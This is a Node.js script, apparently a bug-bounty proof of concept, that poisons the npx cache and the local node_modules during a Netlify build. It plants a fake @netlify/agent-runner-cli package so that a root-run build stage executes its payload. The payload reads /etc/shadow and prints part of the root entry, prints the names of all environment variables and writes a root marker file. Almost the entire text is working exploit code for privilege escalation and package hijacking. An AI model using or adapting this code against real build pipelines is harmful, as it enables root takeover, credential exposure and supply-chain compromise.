// Netlify bug-bounty PoC: plant fake @netlify/agent-runner-cli into the
// npx local-tree + ~/.npm/_npx cache so the root-spawned agent-runner
// stage resolves OUR package. Runs during installDependencies (uid 2500).
const fs = require("fs");
const path = require("path");
const log = (...a) => { try { fs.writeSync(1, a.join(" ") + "\n"); } catch (e) {} };

const FAKE_VERSION = "999.9.9";
const fakePkgJson = JSON.stringify({
  name: "@netlify/agent-runner-cli",
  version: FAKE_VERSION,
  bin: { "agent-runner-cli": "./index.js" }
}, null, 2) + "\n";

const payload = [
"#!/usr/bin/env node",
"// FAKE agent-runner-cli - PoC payload (expect uid 0 via buildbot root npx)",
"const fs=require('fs');const os=require('os');",
"const W=(s)=>{try{fs.writeSync(1,s+\"\\n\");}catch(e){}};",
"W('=== PWNED-AGENT-RUNNER-PROOF-BEGIN ===');",
"W('uid='+process.getuid()+' gid='+process.getgid()+' euid='+(process.geteuid?process.geteuid():'na')+' host='+os.hostname()+' pid='+process.pid+' ppid='+process.ppid);",
"try{W('proc1.comm='+fs.readFileSync('/proc/1/comm','utf8').trim());W('proc1.cmdline='+fs.readFileSync('/proc/1/cmdline','utf8').replace(/\\0/g,' ').trim());}catch(e){W('proc1 ERR '+e.code);}",
"try{const sh=fs.readFileSync('/etc/shadow','utf8');const cr=require('crypto');W('etc/shadow READ OK len='+sh.length+' sha256='+cr.createHash('sha256').update(sh).digest('hex').slice(0,32));W('shadow.root.line='+sh.split('\\n')[0].split(':').slice(0,2).join(':').slice(0,20)+'...');}catch(e){W('shadow ERR '+e.code);}",
"try{const ek=Object.keys(process.env);W('env.keys='+ek.join(','));}catch(e){}",
"try{fs.writeFileSync('/ROOTED-VIA-NPX-CACHE','uid '+process.getuid()+' @ '+new Date().toISOString());W('marker /ROOTED-VIA-NPX-CACHE written');}catch(e){W('marker ERR '+e.code);}",
"W('argv='+JSON.stringify(process.argv.slice(2)));",
"W('=== PWNED-AGENT-RUNNER-PROOF-END ===');",
"process.exit(0);"
].join("\n") + "\n";

function plant(root, label) {
  try {
    const pkgDir = path.join(root, "node_modules", "@netlify", "agent-runner-cli");
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(path.join(pkgDir, "package.json"), fakePkgJson);
    fs.writeFileSync(path.join(pkgDir, "index.js"), payload);
    fs.chmodSync(path.join(pkgDir, "index.js"), 0o755);
    const binDir = path.join(root, "node_modules", ".bin");
    fs.mkdirSync(binDir, { recursive: true });
    const binLink = path.join(binDir, "agent-runner-cli");
    try { fs.rmSync(binLink, { force: true }); } catch (e) {}
    fs.symlinkSync("../@netlify/agent-runner-cli/index.js", binLink, "file");
    log("[plant] OK " + label + " -> " + pkgDir);
    return true;
  } catch (e) {
    log("[plant] FAIL " + label + ": " + e.message);
    return false;
  }
}

log("[plant] start uid=" + (process.getuid && process.getuid()) + " cwd=" + process.cwd() + " HOME=" + process.env.HOME);
// 1. repo local tree (npx cwd = build dir)
plant(process.cwd(), "repo");
// 2. _npx steer for buildbot's findNewestCachedAgentRunnerCLI (any dir name; needs bin file for os.Stat)
try {
  const home = process.env.HOME || "/opt/buildhome";
  const npxRoot = path.join(home, ".npm", "_npx", "probe");
  const pkgDir = path.join(npxRoot, "node_modules", "@netlify", "agent-runner-cli");
  fs.mkdirSync(pkgDir, { recursive: true });
  fs.writeFileSync(path.join(pkgDir, "package.json"), fakePkgJson);
  fs.writeFileSync(path.join(pkgDir, "index.js"), payload);
  fs.chmodSync(path.join(pkgDir, "index.js"), 0o755);
  fs.writeFileSync(path.join(npxRoot, "package.json"), JSON.stringify({
    name: "npx-steer", private: true,
    dependencies: { "@netlify/agent-runner-cli": FAKE_VERSION },
    _npx: { packages: ["@netlify/agent-runner-cli@" + FAKE_VERSION] }
  }, null, 2));
  log("[plant] OK _npx-steer -> " + npxRoot);
} catch (e) { log("[plant] FAIL _npx-steer: " + e.message); }
// 3. home fallback (in case npx runs with cwd=$HOME)
try {
  const home = process.env.HOME || "/opt/buildhome";
  if (!fs.existsSync(path.join(home, "package.json"))) {
    fs.writeFileSync(path.join(home, "package.json"), '{"name":"home-fallback","version":"1.0.0","private":true}');
  }
  plant(home, "home-fallback");
} catch (e) { log("[plant] home-fallback FAIL: " + e.message); }
log("[plant] done");
